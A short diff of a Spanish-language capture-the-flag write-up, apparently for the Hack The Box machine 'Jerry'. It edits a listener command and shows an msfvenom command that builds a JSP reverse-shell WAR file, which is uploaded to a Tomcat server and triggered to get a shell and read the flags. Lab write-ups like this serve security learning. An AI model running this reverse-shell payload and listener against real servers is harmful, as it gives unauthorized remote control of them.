@@ -108,7 +108,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.11 LPORT=443 -f war -o she
 ![[Jerry8.png]]
 Creamos el archivo shell.war que lo vamos a subir a la pagina 
 
-Ahora mientras estamos en escucha con [[rlwrap nc -lvnp 443]] vamos a ingresar a la pagina http://10.10.10.95:8080/shell/ para ejecutar el archivo shell.war que subimos anteriormente
+Ahora mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]] vamos a ingresar a la pagina http://10.10.10.95:8080/shell/ para ejecutar el archivo shell.war que subimos anteriormente
 Y listo ya estamos adentro de la maquina y podemos catear las flags
 ![[Jerry9.png]]
 
